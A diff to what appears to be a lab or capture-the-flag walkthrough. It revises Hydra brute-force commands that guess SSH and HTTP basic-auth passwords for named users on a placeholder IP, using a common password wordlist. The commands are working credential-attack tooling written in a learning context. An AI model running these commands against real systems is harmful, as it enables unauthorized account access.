@@ -16,22 +16,20 @@ jeremy
 ```
 I then ran the below command:
 ```
-hydra \
+hydra -ue nsr \
     -L users.txt \
     -P 10-million-password-list-top-10000.txt \
     -o output.txt \
-    -u -e nsr \
     <IP ADDRESS> ssh
 ```
 
 ### Basic Auth
 To crack the basic auth password i ran the below command:
 ```
-hydra \
+hydra -fue nsr \
     -l bob \
     -P 10-million-password-list-top-10000.txt \
     -o output.txt \
-    -u -e nsr \
     -s 80 \
     <IP ADDRESS> http-get /
 ```
@@ -40,7 +38,7 @@ hydra \
 ### SSH
 To bruteforce the ssh password I ran the below:
 ```
-hydra \
+hydra -f \
     -l keith \
     -x 4:4:1 \
     -o output.txt \
